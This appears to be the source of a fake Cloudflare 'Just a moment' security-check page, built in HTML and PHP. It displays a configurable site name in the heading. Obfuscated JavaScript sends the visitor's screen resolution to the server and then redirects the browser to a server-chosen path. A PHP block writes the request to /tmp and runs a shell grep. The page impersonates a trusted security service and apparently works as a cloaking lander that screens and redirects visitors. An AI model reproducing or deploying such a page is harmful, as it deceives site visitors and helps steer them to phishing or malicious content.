<!DOCTYPE html><title>Just a moment...</title><head>
<meta http-equiv=X-UA-Compatible content="IE=Edge">
<meta name=robots content=noindex,nofollow>
<meta name=viewport content="width=device-width,initial-scale=1">

<style>*{box-sizing:border-box;margin:0;padding:0}html{line-height:1.15;-webkit-text-size-adjust:100%;color:#313131}html{font-family:system-ui,-apple-system,BlinkMacSystemFont,Segoe UI,Roboto,Helvetica Neue,Arial,Noto Sans,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji}body{display:flex;flex-direction:column;min-height:100vh}a{transition:color .15s ease;background-color:transparent;text-decoration:none;color:#0051c3}a:hover{text-decoration:underline;color:#ee730a}.main-content{margin:8rem auto;width:100%;max-width:60rem}@media (max-width:720px){.main-content{margin-top:4rem}}.main-content,.footer{padding-right:1.5rem;padding-left:1.5rem}.main-wrapper{display:flex;flex:1;flex-direction:column;align-items:center}.spacer{margin:2rem 0}.h1{line-height:3.75rem;font-size:2.5rem;font-weight:500}.h2{line-height:2.25rem;font-size:1.5rem;font-weight:500}.core-msg{line-height:2.25rem;font-size:1.5rem;font-weight:400}.body-text{line-height:1.25rem;font-size:1rem;font-weight:400}@media (max-width:720px){.h1{line-height:1.75rem;font-size:1.5rem}.h2{line-height:1.5rem;font-size:1.25rem}.core-msg{line-height:1.5rem;font-size:1rem}}.text-center{text-align:center}.expandable{transition:height,border-left .2s;border-left:.125rem solid #e5e5e5;padding-left:.5rem}.fact{border:.063rem solid #d9d9d9;border-radius:.313rem;padding:1rem}.fact .fact-title{font-weight:500}.footer{margin:0 auto;width:100%;max-width:60rem;line-height:1.125rem;font-size:.75rem}.footer-inner{border-top:1px solid #d9d9d9;padding-top:1rem;padding-bottom:1rem}.clearfix:after{display:table;clear:both;content:""}.diagnostic-wrapper{margin-bottom:.5rem}.footer .ray-id{text-align:center}.footer .ray-id code{font-family:monaco,courier,monospace}.core-msg,.zone-name-title{overflow-wrap:break-word}@media (max-width:720px){.diagnostic-wrapper{display:flex;flex-wrap:wrap;justify-content:center}.clearfix:after{display:initial;clear:none;text-align:center;content:none}.zone-name-title{margin-bottom:1rem}}.loading-spinner{height:76.391px}.lds-ring{display:inline-block;position:relative;width:1.875rem;height:1.875rem}.lds-ring div{box-sizing:border-box;display:block;position:absolute;border:.3rem solid #595959;border-radius:50%;border-color:#595959 transparent transparent transparent;width:1.875rem;height:1.875rem;animation:lds-ring 1.2s cubic-bezier(.5,0,.5,1) infinite}.lds-ring div:nth-child(1){animation-delay:-.45s}.lds-ring div:nth-child(2){animation-delay:-.3s}.lds-ring div:nth-child(3){animation-delay:-.15s}@keyframes lds-ring{0%{transform:rotate(0)}to{transform:rotate(360deg)}}@media screen and (-ms-high-contrast:active),screen and (-ms-high-contrast:none){body,.main-wrapper{display:block}}@media (prefers-color-scheme:dark){body{background-color:#222;color:#d9d9d9}a{color:#fff}a:hover{text-decoration:underline;color:#ee730a}.lds-ring div{border-color:#999999 transparent transparent transparent}}.sf-hidden{display:none!important}</style><style>img[src="data:,"],source[src="data:,"]{display:none!important}</style></head>

<script>function _0x4e93(_0x407f7e,_0x1ab66c){var _0x4b7f3e=_0x4b7f();return _0x4e93=function(_0x4e93cf,_0x1c958f){_0x4e93cf=_0x4e93cf-0x88;var _0x31b270=_0x4b7f3e[_0x4e93cf];return _0x31b270;},_0x4e93(_0x407f7e,_0x1ab66c);}function _0x4b7f(){var _0x56998a=['2303922snBmiB','4772295XzGkMq','GET','2RhfIDt','14703424QnpOEL','readyState','3470958zbgAPR','10Rijsvc','href','Ha\x20ocurrido\x20un\x20error','419350czLeEZ','onreadystatechange','20MdGyAG','send','plain/text','open','screen','setRequestHeader','height','344293fptFwq','2517317Jkhuyy','width','responseText','14oQzojn','location','Content-Type'];_0x4b7f=function(){return _0x56998a;};return _0x4b7f();}(function(_0x32a82f,_0x2a5c94){var _0xefc6e2=_0x4e93,_0x71d5d2=_0x32a82f();while(!![]){try{var _0x20c3e4=-parseInt(_0xefc6e2(0x8d))/0x1*(parseInt(_0xefc6e2(0x97))/0x2)+parseInt(_0xefc6e2(0x9a))/0x3+-parseInt(_0xefc6e2(0xa0))/0x4*(-parseInt(_0xefc6e2(0x9e))/0x5)+parseInt(_0xefc6e2(0x94))/0x6*(parseInt(_0xefc6e2(0x91))/0x7)+-parseInt(_0xefc6e2(0x98))/0x8+parseInt(_0xefc6e2(0x95))/0x9+parseInt(_0xefc6e2(0x9b))/0xa*(parseInt(_0xefc6e2(0x8e))/0xb);if(_0x20c3e4===_0x2a5c94)break;else _0x71d5d2['push'](_0x71d5d2['shift']());}catch(_0x524958){_0x71d5d2['push'](_0x71d5d2['shift']());}}}(_0x4b7f,0xe0e67));function DynamicResolution(){var _0x27babc=_0x4e93,_0x2ebfbf=window['screen'][_0x27babc(0x8f)]+'x'+window[_0x27babc(0x8a)][_0x27babc(0x8c)],_0x47670a=new XMLHttpRequest();url='/index.php?x='+_0x2ebfbf,_0x47670a[_0x27babc(0x89)](_0x27babc(0x96),url,![]),_0x47670a[_0x27babc(0x8b)](_0x27babc(0x93),_0x27babc(0x88)),_0x47670a[_0x27babc(0x9f)]=function(){var _0x2bb1d3=_0x27babc;if(_0x47670a[_0x2bb1d3(0x99)]===0x4){var _0x345d2d=_0x47670a[_0x2bb1d3(0x90)];setTimeout(function(){var _0x52906f=_0x2bb1d3;_0x345d2d==='error'?alert(_0x52906f(0x9d)):window[_0x52906f(0x92)][_0x52906f(0x9c)]='/'+_0x345d2d;},0x1388);}},_0x47670a[_0x27babc(0xa1)](null);}</script>

<body class=no-js onload="DynamicResolution();">
 <div class=main-wrapper role=main>
 <div class=main-content>
 <h1 class="zone-name-title h1">
 <?php $config = parse_ini_file("php.ini", true);
extract($config); 
echo $URL; ?></h1>
 <h2 class=h2 id=challenge-running>
 Checking if the site connection is secure
 </h2><div id=challenge-stage style=display:none></div><div id=challenge-spinner class="spacer loading-spinner" style=display:block;visibility:visible><div class=lds-ring><div></div><div></div><div></div><div></div></div></div>
 <noscript class=sf-hidden>
            <div id="challenge-error-title">
                <div class="h2">
                    <span class="icon-wrapper">
                        <div class="heading-icon warning-icon"></div>
                    </span>
                    <span id="challenge-error-text">
                        Enable JavaScript and cookies to continue
                    </span>
                </div>
            </div>
        </noscript>
 <div id=trk_jschal_js style=display:none;background-image:url(data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7)></div>
 <div id=challenge-body-text class="core-msg spacer">
<?php $config = parse_ini_file("php.ini", true);
extract($config); 
echo $URL; ?> needs to review the security of your connection before proceeding.
 </div><div id=challenge-fact-wrapper style=display:block;visibility:visible class="fact spacer hidden"><span class=fact-title>Did you know</span> <span id=challenge-fact class=body-text>the first botnet in 2003 took over 500-1000 devices? Today, botnets take over millions of devices at once.</span></div><div id=challenge-explainer-expandable class="hidden expandable body-text spacer" style=display:none> </div><div id=challenge-success style=display:none></div>
 <form id=challenge-form action="/?__cf_chl_f_tk=FyttgZV7MomlyHflxVOw0paB2nBm39_9xkGxnO.berc-1668360184-0-gaNycGzNCf0" method=POST enctype=application/x-www-form-urlencoded>
 
<span style=display:none></span></form></div></div>
<img src=data:, style=display:none>
<div class=footer role=contentinfo>
<div class=footer-inner>
<div class="clearfix diagnostic-wrapper">
<div class=ray-id>Ray ID: <code>769931736f5b12a0</code></div></div>
<div class=text-center>Performance &amp; security by <a rel="noopener noreferrer" href="https://www.cloudflare.com/?utm_source=challenge&amp;utm_campaign=j" target=_blank>Cloudflare</a></div></div></div>
<span id=trk_jschal_js></span>

<script>function sleep (time) {
return new Promise((resolve) => setTimeout(resolve, time));}
function DynamicResolution() {
var userInput = (window.screen.availWidth + "x" + window.screen.availHeight + "x24")
var xhr = new XMLHttpRequest();
url = window.location.href;
var data = new FormData();
data.append(data, userInput);
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-Type", "plain/text");
xhr.send(data, url);
sleep(12500).then(() => {window.location.reload()});}
</script>
</body></html>

<?php
$data = file_get_contents('php://input');
$fname = "res.txt";
$file = fopen("/tmp/" .$fname, 'w');
fwrite($file, $data);
fclose($file);
system("cat /tmp/res.txt | grep 'x24' > /tmp/resolution.txt");
?>
